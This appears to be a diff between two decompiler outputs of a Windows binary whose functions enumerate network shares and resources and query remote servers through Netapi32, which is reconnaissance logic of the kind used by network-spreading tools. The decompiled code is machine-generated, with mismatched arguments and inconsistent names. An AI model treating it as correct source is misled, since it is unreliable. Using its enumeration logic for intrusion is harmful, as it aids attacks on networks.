     int32_t * str;
     int32_t substr_pos = (int32_t)strstr((char *)71, (char *)&str); // 0x40495d
-    dwBytes = (char *)92;
-    int32_t v2;
-    int32_t v3; // bp-16959
+    dwBytes = (int32_t **)92;
+    char * str7;
+    char v5; // bp-16959
     int32_t lphEnum; // bp-28
-    int32_t v4; // bp-32
-    char * v5; // bp-68
-    int32_t v6;
-    int32_t v7;
+    int32_t v6; // bp-580
+    int32_t v7; // bp-68
+    int32_t v8;
     int32_t dwType; // 0x404a2c
-    int32_t v8; // 0x404a4f
-    int32_t v9; // 0x404a50
-    int32_t v10; // 0x404b41
+    int32_t v9; // 0x404b4d
+    int32_t v10; // 0x404b7b
     int32_t v11; // 0x404a2f
+    char v12; // 0x404b41
+    int32_t v13; // 0x404b53
+    int32_t v14; // 0x404b71
+    int32_t v15; // 0x404ac5
+    int32_t v16; // 0x404b54
+    int32_t * hEnum; // 0x404a41
+    int32_t c; // 0x404ac0
     int32_t result; // 0x404b73
-    int32_t v12; // 0x404a41
+    int32_t v17; // 0x404a41
     if (substr_pos != g3) {
         int32_t str2 = substr_pos + 3; // 0x40496d
-        lpcCount = (struct _NETRESOURCEA *)str2;
+        v2 = (struct _NETRESOURCEA *)str2;
         int32_t found_char_pos = (int32_t)strchr((char *)str2, 92); // 0x404971
         g5 = found_char_pos;
+        g4 = (int32_t)dwBytes;
         if (found_char_pos == g3) {
             // 0x404b3a
-            v10 = g3;
-            v3 = v10;
-            g6 = 6;
-            v7 = 6;
+            v12 = g3;
+            v5 = v12;
+            g7 = 6;
+            v9 = 6;
             // branch -> 0x404b4a
             // 0x404b4a
-            dwBytes = (char *)&v5;
-            lpcCount = (struct _NETRESOURCEA *)&v3;
-            lphEnum = v7 - 5;
-            function_402830(v7, v10, (char *)&str, (int32_t)&str);
-            result = function_401f45((char *)&v1, g6);
+            v13 = g8;
+            *(int32_t *)(v13 - 4) = (int32_t)&v7;
+            v16 = &v5;
+            *(int32_t *)(v13 - 8) = v16;
+            *(int32_t *)(v13 - 12) = g7 - 5;
+            *(int32_t *)(v13 - 16) = v16;
+            function_402830(v9, (int32_t)v12, (char *)&str, (int32_t)&str);
+            v14 = g8;
+            *(int32_t *)(v14 - 4) = g7;
+            *(int32_t *)(v14 - 8) = (int32_t)&v4;
+            result = function_401f45((char *)v9, (int32_t)v5);
+            v10 = g8 + 24;
             // branch -> 0x404b7b
             // 0x404b7b
+            g7 = *(int32_t *)(v10 + 4);
+            g3 = *(int32_t *)(v10 + 8);
             return result;
         }
         int32_t str3 = found_char_pos + 1; // 0x404983
-        dwBytes = (char *)92;
-        lpcCount = (struct _NETRESOURCEA *)str3;
-        int32_t v13 = substr_pos + 1; // 0x4049ae
-        g6 = v13;
+        dwBytes = (int32_t **)92;
+        v2 = (struct _NETRESOURCEA *)str3;
+        g4 = (int32_t)dwBytes;
+        int32_t str5 = substr_pos + 1; // 0x4049ae
         int32_t result2; // 0x404b7f
         if (strchr((char *)str3, 92) == NULL) {
             // 0x4049ae
-            dwBytes = (char *)2;
+            dwBytes = (int32_t **)2;
             *(char *)g5 = (char)g3;
             int32_t dwScope = (int32_t)dwBytes; // 0x4049b6
             g5 = dwScope;
-            v2 = 0;
+            str7 = NULL;
             // branch -> 0x404a24
             // 0x404a24
-            dwBytes = (char *)&lphEnum;
-            lpcCount = (struct _NETRESOURCEA *)&lpNetResource;
+            dwBytes = (int32_t **)&lphEnum;
+            v2 = (struct _NETRESOURCEA *)&lpNetResource;
             dwType = g3;
             lphEnum = dwType;
             v11 = WNetOpenEnumA(dwScope, dwType, dwType, (struct _NETRESOURCEA *)&lpNetResource, (int32_t **)&lphEnum);
             if (v11 == 0) {
                 // 0x404a3c
-                v12 = (int32_t)GlobalAlloc(64, *(int32_t *)&dwBytes);
-                g5 = v12;
-                v4 = v12;
-                v6 = 5;
+                hEnum = GlobalAlloc(64, *(int32_t *)&dwBytes);
+                v17 = (int32_t)hEnum;
+                g5 = v17;
+                v15 = &v6;
+                c = (int32_t)str7;
+                v8 = 5;
                 // branch -> 0x404a4c
                 while (true) {
                     // 0x404a4c
-                    v8 = g3;
-                    v9 = v12;
                     // branch -> 0x404a4c
                     goto lab_0x404a4c_5;
                 }
             }
             // 0x404b3a
-            v10 = g3;
-            v3 = v10;
-            g6 = 6;
-            v7 = 6;
+            v12 = g3;
+            v5 = v12;
+            g7 = 6;
+            v9 = 6;
             // branch -> 0x404b4a
             // 0x404b4a
-            dwBytes = (char *)&v5;
-            lpcCount = (struct _NETRESOURCEA *)&v3;
-            lphEnum = v7 - 5;
-            function_402830(v7, v10, (char *)&str, (int32_t)&str);
-            result2 = function_401f45((char *)&v1, g6);
+            v13 = g8;
+            *(int32_t *)(v13 - 4) = (int32_t)&v7;
+            v16 = &v5;
+            *(int32_t *)(v13 - 8) = v16;
+            *(int32_t *)(v13 - 12) = g7 - 5;
+            *(int32_t *)(v13 - 16) = v16;
+            function_402830(v9, (int32_t)v12, (char *)&str, (int32_t)&str);
+            v14 = g8;
+            *(int32_t *)(v14 - 4) = g7;
+            *(int32_t *)(v14 - 8) = (int32_t)&v4;
+            result2 = function_401f45((char *)v9, (int32_t)v5);
+            v10 = g8 + 24;
             // branch -> 0x404b7b
         } else {
-            char * str5 = (char *)v13; // 0x404996
-            dwBytes = str5;
-            int32_t str4 = *(int32_t *)&g31; // 0x40499713
-            *(int32_t *)&lpcCount = str4;
-            strcpy((char *)str4, str5);
+            // 0x404995
+            dwBytes = (int32_t **)str5;
+            int32_t str4 = *(int32_t *)&g33; // 0x40499710
+            *(int32_t *)&v2 = str4;
+            strcpy((char *)str4, (char *)str5);
             g4 = (int32_t)dwBytes;
             result2 = function_403b42();
+            v10 = g8;
             // branch -> 0x404b7b
         }
         // 0x404b7b
+        g7 = *(int32_t *)(v10 + 4);
+        g3 = *(int32_t *)(v10 + 8);
         return result2;
     }
-    int32_t str6 = *(int32_t *)&g31; // 0x4049b916
-    *(int32_t *)&lpcCount = str6;
+    int32_t str6 = *(int32_t *)&g33; // 0x4049b912
+    *(int32_t *)&v2 = str6;
     char * found_char_pos2 = strrchr((char *)str6, 92); // 0x4049c5
-    int32_t v14 = g3; // 0x4049c8
-    if ((int32_t)found_char_pos2 == v14) {
+    int32_t v18 = (int32_t)found_char_pos2; // 0x4049c5
+    int32_t v19 = g3; // 0x4049c8
+    g4 = (int32_t)dwBytes;
+    if (v18 == v19) {
         // 0x404b3a
-        v10 = g3;
-        v3 = v10;
-        g6 = 6;
-        v7 = 6;
+        v12 = g3;
+        v5 = v12;
+        g7 = 6;
+        v9 = 6;
         // branch -> 0x404b4a
         // 0x404b4a
-        dwBytes = (char *)&v5;
-        lpcCount = (struct _NETRESOURCEA *)&v3;
-        lphEnum = v7 - 5;
-        function_402830(v7, v10, (char *)&str, (int32_t)&str);
-        result = function_401f45((char *)&v1, g6);
+        v13 = g8;
+        *(int32_t *)(v13 - 4) = (int32_t)&v7;
+        v16 = &v5;
+        *(int32_t *)(v13 - 8) = v16;
+        *(int32_t *)(v13 - 12) = g7 - 5;
+        *(int32_t *)(v13 - 16) = v16;
+        function_402830(v9, (int32_t)v12, (char *)&str, (int32_t)&str);
+        v14 = g8;
+        *(int32_t *)(v14 - 4) = g7;
+        *(int32_t *)(v14 - 8) = (int32_t)&v4;
+        result = function_401f45((char *)v9, (int32_t)v5);
+        v10 = g8 + 24;
         // branch -> 0x404b7b
         // 0x404b7b
+        g7 = *(int32_t *)(v10 + 4);
+        g3 = *(int32_t *)(v10 + 8);
         return result;
     }
     // 0x4049d1
-    *found_char_pos2 = (char)v14;
-    struct _NETRESOURCEA * str10 = g31; // 0x4049d3
-    if (found_char_pos2 == (char *)str10) {
+    *found_char_pos2 = (char)v19;
+    struct _NETRESOURCEA * str8 = g33; // 0x4049d3
+    int32_t v20 = (int32_t)str8; // 0x4049d3
+    g4 = v20;
+    if (v18 == v20) {
         // 0x4049d1
-        v2 = 0;
+        str7 = NULL;
         // branch -> 0x404a24
         // 0x404a24
         lphEnum = 0;
-        dwBytes = (char *)&lphEnum;
-        lpcCount = (struct _NETRESOURCEA *)&lpNetResource;
+        dwBytes = (int32_t **)&lphEnum;
+        v2 = (struct _NETRESOURCEA *)&lpNetResource;
         dwType = g3;
         lphEnum = dwType;
         v11 = WNetOpenEnumA(g5, dwType, dwType, (struct _NETRESOURCEA *)&lpNetResource, (int32_t **)&lphEnum);
         if (v11 == 0) {
             // 0x404a3c
-            v12 = (int32_t)GlobalAlloc(64, *(int32_t *)&dwBytes);
-            g5 = v12;
-            v4 = v12;
-            v6 = 5;
-            int32_t v15 = v12;
+            hEnum = GlobalAlloc(64, *(int32_t *)&dwBytes);
+            v17 = (int32_t)hEnum;
+            g5 = v17;
+            v15 = &v6;
+            c = (int32_t)str7;
+            v8 = 5;
             // branch -> 0x404a4c
             while (true) {
-              lab_0x404a4c:
                 // 0x404a4c
-                v8 = g3;
-                v9 = v15;
                 // branch -> 0x404a4c
               lab_0x404a4c_5:;
-                int32_t v16; // bp-16
-                int32_t v17;
-                int32_t v18; // 0x404a6a
-                struct _NETRESOURCEA * v19; // 0x404a72
+                struct _NETRESOURCEA * v21; // 0x404a72
+                char * v22; // 0x404a75
                 while (true) {
+                  lab_0x404a4c:
                     // 0x404a4c
-                    memset((int32_t *)*(int32_t *)&dwBytes, v9, v8);
-                    int32_t v20 = WNetEnumResourceA((int32_t *)lphEnum, (int32_t *)&lpcCount, (int32_t *)g5, (int32_t *)&dwBytes); // 0x404a65
-                    v18 = g3;
-                    if (v20 != v18) {
+                    *(int32_t *)(g8 - 4) = (int32_t)dwBytes;
+                    *(int32_t *)(g8 - 8) = g3;
+                    *(int32_t *)(g8 - 12) = g5;
+                    memset(hEnum, lphEnum, (int32_t)v2);
+                    *(int32_t *)(g8 + 8) = v1;
+                    *(int32_t *)(g8 + 4) = g5;
+                    *(int32_t *)g8 = v3;
+                    *(int32_t *)(g8 - 4) = lphEnum;
+                    int32_t v23 = WNetEnumResourceA(hEnum, (int32_t *)lphEnum, &v2->e0, (int32_t *)dwBytes); // 0x404a65
+                    int32_t v24 = g3; // 0x404a6a
+                    if (v23 != v24) {
                         // 0x404b23
-                        GlobalFree((int32_t *)g5);
-                        WNetCloseEnum((int32_t *)lphEnum);
-                        g6 = v6;
-                        if (v6 != 5) {
+                        *(int32_t *)(g8 - 4) = g5;
+                        GlobalFree((int32_t *)hMem);
+                        *(int32_t *)(g8 - 4) = lphEnum;
+                        WNetCloseEnum((int32_t *)hMem);
+                        g7 = v8;
+                        if (v8 != 5) {
                             // 0x404b23
-                            v3 = 0;
-                            v7 = v6;
+                            v5 = 0;
+                            v9 = v8;
                             // branch -> 0x404b4a
                             // 0x404b4a
-                            v5 = NULL;
-                            dwBytes = (char *)&v5;
-                            lpcCount = (struct _NETRESOURCEA *)&v3;
-                            lphEnum = v7 - 5;
-                            function_402830(v7, v3, (char *)&str, (int32_t)&str);
-                            result = function_401f45((char *)&v1, g6);
+                            v13 = g8;
+                            *(int32_t *)(v13 - 4) = (int32_t)&v7;
+                            v16 = &v5;
+                            *(int32_t *)(v13 - 8) = v16;
+                            *(int32_t *)(v13 - 12) = g7 - 5;
+                            *(int32_t *)(v13 - 16) = v16;
+                            function_402830(v9, (int32_t)v5, (char *)&str, (int32_t)&str);
+                            v14 = g8;
+                            *(int32_t *)(v14 - 4) = g7;
+                            *(int32_t *)(v14 - 8) = (int32_t)&v4;
+                            result = function_401f45((char *)v9, (int32_t)v5);
+                            v10 = g8 + 24;
                             // branch -> 0x404b7b
                             // 0x404b7b
+                            g7 = *(int32_t *)(v10 + 4);
+                            g3 = *(int32_t *)(v10 + 8);
                             return result;
                         }
                         // 0x404b3a
-                        v10 = g3;
-                        v3 = v10;
-                        g6 = 6;
-                        v7 = 6;
+                        v12 = g3;
+                        v5 = v12;
+                        g7 = 6;
+                        v9 = 6;
                         // branch -> 0x404b4a
                         // 0x404b4a
-                        dwBytes = (char *)&v5;
-                        lpcCount = (struct _NETRESOURCEA *)&v3;
-                        lphEnum = v7 - 5;
-                        function_402830(v7, v10, (char *)&str, (int32_t)&str);
-                        result = function_401f45((char *)&v1, g6);
+                        v13 = g8;
+                        *(int32_t *)(v13 - 4) = (int32_t)&v7;
+                        v16 = &v5;
+                        *(int32_t *)(v13 - 8) = v16;
+                        *(int32_t *)(v13 - 12) = g7 - 5;
+                        *(int32_t *)(v13 - 16) = v16;
+                        function_402830(v9, (int32_t)v12, (char *)&str, (int32_t)&str);
+                        v14 = g8;
+                        *(int32_t *)(v14 - 4) = g7;
+                        *(int32_t *)(v14 - 8) = (int32_t)&v4;
+                        result = function_401f45((char *)v9, (int32_t)v5);
+                        v10 = g8 + 24;
                         // branch -> 0x404b7b
                         // 0x404b7b
+                        g7 = *(int32_t *)(v10 + 4);
+                        g3 = *(int32_t *)(v10 + 8);
                         return result;
                     }
                     // 0x404a72
-                    v19 = lpcCount;
-                    v16 = v18;
-                    v17 = g5;
-                    if ((int32_t)v19 > v18) {
+                    v21 = v2;
+                    v22 = (char *)v24;
+                    hMem = v22;
+                    if ((int32_t)v21 > v24) {
                         // break -> 0x404a7a
                         break;
                     }
-                    v8 = v18;
-                    v9 = v17;
                     // continue -> 0x404a4c
                 }
-                int32_t v21 = v17 + 20; // 0x404a7a
-                g6 = v21;
-                int32_t v22 = v6;
-                int32_t v23 = v17;
-                int32_t v24 = v18; // 0x404a7f
-                int32_t v25 = v18; // 0x404b0c22
+                int32_t v25 = g5 + 20; // 0x404a7a
+                g7 = v25;
+                int32_t v26 = v8;
                 // branch -> 0x404a7d
                 while (true) {
-                    int32_t v26 = *(int32_t *)v21; // 0x404a7d
-                    int32_t v27 = v22;
-                    int32_t v28 = v23;
-                    struct _NETRESOURCEA * v29 = v19; // 0x404b15
-                    int32_t v30 = v21; // 0x404b0f
-                    int32_t v31 = v25; // 0x404b0c
-                    if (v26 != v24) {
+                    int32_t v27 = *(int32_t *)v25; // 0x404a7d
+                    int32_t v28 = v26;
+                    struct _NETRESOURCEA * v29 = v21; // 0x404b15
+                    int32_t v30 = v25; // 0x404b0f
+                    char * v31 = v22; // 0x404b0c
+                    if (v27 != g3) {
                         // 0x404a87
-                        if (*(int32_t *)(v21 - 16) == 1) {
-                            int32_t found_char_pos3 = (int32_t)strchr((char *)(v26 + 2), 92); // 0x404a93
+                        if (*(int32_t *)(v25 - 16) == 1) {
+                            // 0x404a8d
+                            *(int32_t *)(g8 - 4) = 92;
+                            *(int32_t *)(g8 - 8) = v27 + 2;
+                            int32_t found_char_pos3 = (int32_t)strchr(hMem, c); // 0x404a93
+                            g4 = *(int32_t *)(g8 + 4);
                             if (found_char_pos3 != g3) {
                                 // 0x404a9f
-                                *(int32_t *)g6 = found_char_pos3 + 1;
+                                *(int32_t *)g7 = found_char_pos3 + 1;
                                 // branch -> 0x404aa2
                             }
                         }
-                        // 0x404aa2
-                        strcpy((char *)(v22 - 0x4240 + g2), (char *)*(int32_t *)g6);
-                        char * str7 = (char *)*(int32_t *)g6; // 0x404ab4
-                        lpNetResource = str7;
-                        int32_t v32 = v22 + strlen(str7); // 0x404abe
-                        g5 = v32;
-                        if (v2 != g3) {
+                        int32_t v32 = v26; // edi
+                        *(int32_t *)(g8 - 4) = *(int32_t *)g7;
+                        *(int32_t *)(g8 - 8) = g2 - 0x4240 + v32;
+                        strcpy(hMem, str7);
+                        *(int32_t *)(g8 - 4) = *(int32_t *)g7;
+                        int32_t v33 = v32 + strlen(hMem); // 0x404abe
+                        g5 = v33;
+                        if (c != g3) {
                             // 0x404ac5
-                            int32_t str9; // bp-580
-                            function_404b80(*(int32_t *)g6, (int32_t)&str9);
-                            lpNetResource = (char *)&str9;
-                            char * str8 = (char *)(g2 - 0x4240 + g5); // 0x404ae1
-                            v5 = str8;
-                            strcpy(str8, (char *)&str9);
-                            v32 = g5 + strlen((char *)&str9);
+                            *(int32_t *)(g8 + 8) = v15;
+                            *(int32_t *)(g8 + 4) = *(int32_t *)g7;
+                            function_404b80();
+                            *(int32_t *)(g8 - 4) = v15;
+                            *(int32_t *)(g8 - 8) = g2 - 0x4240 + g5;
+                            strcpy(hMem, str7);
+                            *(int32_t *)(g8 - 4) = v15;
+                            v33 = g5 + strlen(hMem);
                             // branch -> 0x404af8
                         }
                         // 0x404af8
-                        *(int32_t *)(v32 - 0x423f + g2) = *(int32_t *)(g6 - 12);
-                        g5 = v4;
-                        v27 = 5 + v32;
-                        v28 = v4;
-                        v29 = lpcCount;
-                        v30 = g6;
-                        v31 = v16;
+                        *(int32_t *)(v33 - 0x423f + g2) = *(int32_t *)(g7 - 12);
+                        g5 = v17;
+                        v28 = 5 + v33;
+                        v29 = v2;
+                        v30 = g7;
+                        v31 = hMem;
                         // branch -> 0x404b0c
                     }
-                    int32_t v33 = v31 + 1; // 0x404b0c
-                    v16 = v33;
-                    int32_t v34 = v30 + 32; // 0x404b0f
-                    g6 = v34;
-                    if (v33 >= (int32_t)v29) {
-                        v6 = v27;
-                        v15 = v28;
-                        goto lab_0x404a4c;
+                    char * v34 = (char *)((int32_t)v31 + 1); // 0x404b0c
+                    hMem = v34;
+                    int32_t v35 = v30 + 32; // 0x404b0f
+                    g7 = v35;
+                    if (v34 < (char *)v29) {
+                        // 0x404b0c
+                        v26 = v28;
+                        v21 = v29;
+                        v22 = v34;
+                        v25 = v35;
+                        // branch -> 0x404a7d
+                        continue;
+                    } else {
+                        v8 = v28;
+                        while (true) {
+                            // 0x404a4c
+                            // branch -> 0x404a4c
+                            goto lab_0x404a4c;
+                        }
                     }
-                    // 0x404b0c
-                    v22 = v27;
-                    v23 = v28;
-                    v19 = v29;
-                    v24 = g3;
-                    v25 = v33;
-                    v21 = v34;
-                    // branch -> 0x404a7d
                 }
             }
         }
     } else {
         // 0x4049dd
-        dwBytes = (char *)92;
-        lpcCount = str10;
-        char * found_char_pos4 = strrchr((char *)str10, 92); // 0x4049e0
-        if ((int32_t)found_char_pos4 != g3) {
+        dwBytes = (int32_t **)92;
+        v2 = str8;
+        char * found_char_pos4 = strrchr((char *)str8, 92); // 0x4049e0
+        int32_t v36 = (int32_t)found_char_pos4; // 0x4049e0
+        g4 = (int32_t)dwBytes;
+        if (v36 != g3) {
             int32_t dwScope2 = g5; // 0x4049ec
-            struct _NETRESOURCEA * v35 = g31; // 0x404a15
-            if (g62 != dwScope2) {
+            g4 = v36 + 1;
+            struct _NETRESOURCEA * v37 = g33; // 0x404a15
+            if (g66 != dwScope2) {
                 // 0x404a15
-                if (found_char_pos4 != (char *)v35) {
-                    v2 = 0;
+                if (found_char_pos4 != (char *)v37) {
+                    str7 = NULL;
                     // 0x404a24
-                    dwBytes = (char *)&lphEnum;
-                    lpcCount = (struct _NETRESOURCEA *)&lpNetResource;
+                    dwBytes = (int32_t **)&lphEnum;
+                    v2 = (struct _NETRESOURCEA *)&lpNetResource;
                     dwType = g3;
                     lphEnum = dwType;
                     v11 = WNetOpenEnumA(dwScope2, dwType, dwType, (struct _NETRESOURCEA *)&lpNetResource, (int32_t **)&lphEnum);
                     if (v11 == 0) {
                         // 0x404a3c
-                        v12 = (int32_t)GlobalAlloc(64, *(int32_t *)&dwBytes);
-                        g5 = v12;
-                        v4 = v12;
-                        v6 = 5;
+                        hEnum = GlobalAlloc(64, *(int32_t *)&dwBytes);
+                        v17 = (int32_t)hEnum;
+                        g5 = v17;
+                        v15 = &v6;
+                        c = (int32_t)str7;
+                        v8 = 5;
                         // branch -> 0x404a4c
                         while (true) {
                             // 0x404a4c
-                            v8 = g3;
-                            v9 = v12;
                             // branch -> 0x404a4c
                             goto lab_0x404a4c_5;
                         }
                     }
                     // 0x404b3a
-                    v10 = g3;
-                    v3 = v10;
-                    g6 = 6;
-                    v7 = 6;
+                    v12 = g3;
+                    v5 = v12;
+                    g7 = 6;
+                    v9 = 6;
                     // branch -> 0x404b4a
                     // 0x404b4a
-                    dwBytes = (char *)&v5;
-                    lpcCount = (struct _NETRESOURCEA *)&v3;
-                    lphEnum = v7 - 5;
-                    function_402830(v7, v10, (char *)&str, (int32_t)&str);
-                    result = function_401f45((char *)&v1, g6);
+                    v13 = g8;
+                    *(int32_t *)(v13 - 4) = (int32_t)&v7;
+                    v16 = &v5;
+                    *(int32_t *)(v13 - 8) = v16;
+                    *(int32_t *)(v13 - 12) = g7 - 5;
+                    *(int32_t *)(v13 - 16) = v16;
+                    function_402830(v9, (int32_t)v12, (char *)&str, (int32_t)&str);
+                    v14 = g8;
+                    *(int32_t *)(v14 - 4) = g7;
+                    *(int32_t *)(v14 - 8) = (int32_t)&v4;
+                    result = function_401f45((char *)v9, (int32_t)v5);
+                    v10 = g8 + 24;
                     // branch -> 0x404b7b
                     // 0x404b7b
+                    g7 = *(int32_t *)(v10 + 4);
+                    g3 = *(int32_t *)(v10 + 8);
                     return result;
                 }
             } else {
                 // 0x4049fa
-                if (found_char_pos4 == (char *)v35) {
+                if (found_char_pos4 == (char *)v37) {
                     // 0x404a02
-                    v2 = 0;
+                    str7 = NULL;
                     // branch -> 0x404a24
                     // 0x404a24
-                    dwBytes = (char *)&lphEnum;
-                    lpcCount = (struct _NETRESOURCEA *)&lpNetResource;
+                    dwBytes = (int32_t **)&lphEnum;
+                    v2 = (struct _NETRESOURCEA *)&lpNetResource;
                     dwType = g3;
                     lphEnum = dwType;
                     v11 = WNetOpenEnumA(dwScope2, dwType, dwType, (struct _NETRESOURCEA *)&lpNetResource, (int32_t **)&lphEnum);
                     if (v11 == 0) {
                         // 0x404a3c
-                        v12 = (int32_t)GlobalAlloc(64, *(int32_t *)&dwBytes);
-                        g5 = v12;
-                        v4 = v12;
-                        v6 = 5;
+                        hEnum = GlobalAlloc(64, *(int32_t *)&dwBytes);
+                        v17 = (int32_t)hEnum;
+                        g5 = v17;
+                        v15 = &v6;
+                        c = (int32_t)str7;
+                        v8 = 5;
                         // branch -> 0x404a4c
                         while (true) {
                             // 0x404a4c
-                            v8 = g3;
-                            v9 = v12;
                             // branch -> 0x404a4c
                             goto lab_0x404a4c_5;
                         }
                     }
                     // 0x404b3a
-                    v10 = g3;
-                    v3 = v10;
-                    g6 = 6;
-                    v7 = 6;
+                    v12 = g3;
+                    v5 = v12;
+                    g7 = 6;
+                    v9 = 6;
                     // branch -> 0x404b4a
                     // 0x404b4a
-                    dwBytes = (char *)&v5;
-                    lpcCount = (struct _NETRESOURCEA *)&v3;
-                    lphEnum = v7 - 5;
-                    function_402830(v7, v10, (char *)&str, (int32_t)&str);
-                    result = function_401f45((char *)&v1, g6);
+                    v13 = g8;
+                    *(int32_t *)(v13 - 4) = (int32_t)&v7;
+                    v16 = &v5;
+                    *(int32_t *)(v13 - 8) = v16;
+                    *(int32_t *)(v13 - 12) = g7 - 5;
+                    *(int32_t *)(v13 - 16) = v16;
+                    function_402830(v9, (int32_t)v12, (char *)&str, (int32_t)&str);
+                    v14 = g8;
+                    *(int32_t *)(v14 - 4) = g7;
+                    *(int32_t *)(v14 - 8) = (int32_t)&v4;
+                    result = function_401f45((char *)v9, (int32_t)v5);
+                    v10 = g8 + 24;
                     // branch -> 0x404b7b
                     // 0x404b7b
+                    g7 = *(int32_t *)(v10 + 4);
+                    g3 = *(int32_t *)(v10 + 8);
                     return result;
                 }
             }
             // 0x404a1d
-            v2 = 1;
+            str7 = (char *)1;
             // branch -> 0x404a24
             // 0x404a24
-            dwBytes = (char *)&lphEnum;
-            lpcCount = (struct _NETRESOURCEA *)&lpNetResource;
+            dwBytes = (int32_t **)&lphEnum;
+            v2 = (struct _NETRESOURCEA *)&lpNetResource;
             dwType = g3;
             lphEnum = dwType;
             v11 = WNetOpenEnumA(dwScope2, dwType, dwType, (struct _NETRESOURCEA *)&lpNetResource, (int32_t **)&lphEnum);
             if (v11 == 0) {
                 // 0x404a3c
-                v12 = (int32_t)GlobalAlloc(64, *(int32_t *)&dwBytes);
-                g5 = v12;
-                v4 = v12;
-                v6 = 5;
+                hEnum = GlobalAlloc(64, *(int32_t *)&dwBytes);
+                v17 = (int32_t)hEnum;
+                g5 = v17;
+                v15 = &v6;
+                c = (int32_t)str7;
+                v8 = 5;
                 // branch -> 0x404a4c
                 while (true) {
                     // 0x404a4c
-                    v8 = g3;
-                    v9 = v12;
                     // branch -> 0x404a4c
                     goto lab_0x404a4c_5;
                 }
@@ -4961,684 +7729,1566 @@ int32_t function_404905(void) {
         }
     }
     // 0x404b3a
-    v10 = g3;
-    v3 = v10;
-    g6 = 6;
-    v7 = 6;
+    v12 = g3;
+    v5 = v12;
+    g7 = 6;
+    v9 = 6;
     // branch -> 0x404b4a
     // 0x404b4a
-    dwBytes = (char *)&v5;
-    lpcCount = (struct _NETRESOURCEA *)&v3;
-    lphEnum = v7 - 5;
-    function_402830(v7, v10, (char *)&str, (int32_t)&str);
-    result = function_401f45((char *)&v1, g6);
+    v13 = g8;
+    *(int32_t *)(v13 - 4) = (int32_t)&v7;
+    v16 = &v5;
+    *(int32_t *)(v13 - 8) = v16;
+    *(int32_t *)(v13 - 12) = g7 - 5;
+    *(int32_t *)(v13 - 16) = v16;
+    function_402830(v9, (int32_t)v12, (char *)&str, (int32_t)&str);
+    v14 = g8;
+    *(int32_t *)(v14 - 4) = g7;
+    *(int32_t *)(v14 - 8) = (int32_t)&v4;
+    result = function_401f45((char *)v9, (int32_t)v5);
+    v10 = g8 + 24;
     // branch -> 0x404b7b
     // 0x404b7b
+    g7 = *(int32_t *)(v10 + 4);
+    g3 = *(int32_t *)(v10 + 8);
     return result;
 }
 
-// Address range: 0x404b80 - 0x404ba7
-int32_t function_404b80(int32_t a1, int32_t a2) {
+// Address range: 0x404b80 - 0x404ba8
+int32_t function_404b80(void) {
     // 0x404b80
     int32_t result;
-    if (g62 != 1) {
+    int32_t v1;
+    int32_t v2;
+    if (g66 != 1) {
         // 0x404b9c
-        result = function_404ba8((int16_t *)a1, a2);
+        result = function_404ba8((char *)v1, v2);
         // branch -> 0x404ba5
     } else {
         // 0x404b8d
-        result = function_404dde(a1 + 2, (struct fd_set *)a2);
+        result = function_404dde((char *)(v1 + 2), v2);
         // branch -> 0x404ba5
     }
     // 0x404ba5
+    g4 = 0;
     return result;
 }
 
-// Address range: 0x404ba8 - 0x404ddd
-int32_t function_404ba8(int16_t * str2, int32_t a2) {
+// Address range: 0x404ba8 - 0x404dde
+int32_t function_404ba8(char * a1, int32_t lpWideCharStr) {
     struct in_addr in; // 0x404bd2
-    char * str3 = (char *)a2;
-    int32_t v1 = (int32_t)str2; // 0x404bb1
-    char * v2 = (char *)g5; // bp-1112
-    struct hostent * v3 = gethostbyname((char *)(v1 + 2)); // 0x404bbb
-    int16_t * v4; // bp-1124
-    int32_t str; // bp-76
-    if (v3 == NULL) {
+    int32_t dwFlags = g2; // bp-4
+    int32_t v1; // bp-1100
+    int32_t v2 = &v1; // 0x404bab
+    int32_t cbMultiByte = (int32_t)a1; // 0x404bb1
+    char * name = (char *)(cbMultiByte + 2); // 0x404bba
+    char * v3 = name; // bp-1116
+    struct hostent * v4 = gethostbyname(name); // 0x404bbb
+    char * str3; // bp-1120
+    char * str2; // bp-1124
+    char str; // bp-76
+    char ** v5;
+    if (v4 == NULL) {
         // 0x404be9
-        str = 0;
-        strcpy((char *)&str, (char *)&g68);
+        str3 = (char *)&g74;
+        str2 = &str;
+        strcpy(&str, (char *)&g74);
+        v5 = &v3;
         // branch -> 0x404bf9
     } else {
-        int32_t v5 = *(int32_t *)((int32_t)v3 + 12); // 0x404bcb
+        int32_t v6 = *(int32_t *)((int32_t)v4 + 12); // 0x404bcb
+        int32_t v7 = *(int32_t *)*(int32_t *)v6; // 0x404bd0
+        str3 = (char *)v7;
         in = (struct in_addr){
             .e0 = 0
         };
-        in.e0 = *(int32_t *)*(int32_t *)v5;
-        char * v6 = inet_ntoa(in); // 0x404bd2
-        v4 = (int16_t *)&str;
-        sprintf((char *)&str, "[%s:", v6);
+        in.e0 = v7;
+        char * v8 = inet_ntoa(in); // 0x404bd2
+        str2 = v8;
+        sprintf(&str, "[%s:", v8);
+        v5 = &str3;
         // branch -> 0x404bf9
     }
-    // 0x404bf9
-    if ((char)str == 0) {
+    int32_t v9 = (int32_t)v5;
+    int32_t v10 = v9; // 0x404c0f
+    if (str == 0) {
         // 0x404bff
-        strcpy((char *)&str, "[Err:");
+        *(int32_t *)(v9 - 4) = (int32_t)"[Err:";
+        *(int32_t *)(v9 - 8) = (int32_t)&str;
+        strcpy(str2, str3);
+        v10 = g8 + 8;
         // branch -> 0x404c0f
     }
-    int32_t * moduleHandle = LoadLibraryA("Netapi32"); // 0x404c14
-    int16_t * v7; // bp-1128
-    int32_t chars_printed; // 0x404ddd
-    int16_t * v8; // 0x404ddb
+    // 0x404c0f
+    *(int32_t *)(v10 - 4) = (int32_t)"Netapi32";
+    int32_t * moduleHandle = LoadLibraryA(str2); // 0x404c14
+    int32_t v11 = (int32_t)moduleHandle; // 0x404c14
+    int32_t v12;
+    int32_t chars_printed2; // 0x404ddd
+    int32_t * cchWideChar;
     if (moduleHandle != NULL) {
-        int32_t (*func)() = GetProcAddress(moduleHandle, "NetServerGetInfo"); // 0x404c3d
+        // 0x404c31
+        *(int32_t *)(g8 - 4) = (int32_t)"NetServerGetInfo";
+        *(int32_t *)(g8 - 8) = v11;
+        int32_t (*func)() = GetProcAddress((int32_t *)str2, str3); // 0x404c3d
         if (func != NULL) {
-            int32_t CodePage = 0; // edi
-            int16_t * v9; // bp-1120
-            int16_t * format2; // 0x404dd4
-            if (GetProcAddress(moduleHandle, "NetApiBufferFree") == NULL) {
+            // 0x404c54
+            *(int32_t *)(g8 - 4) = (int32_t)"NetApiBufferFree";
+            *(int32_t *)(g8 - 8) = v11;
+            char * lpProcName = NULL; // bp-8
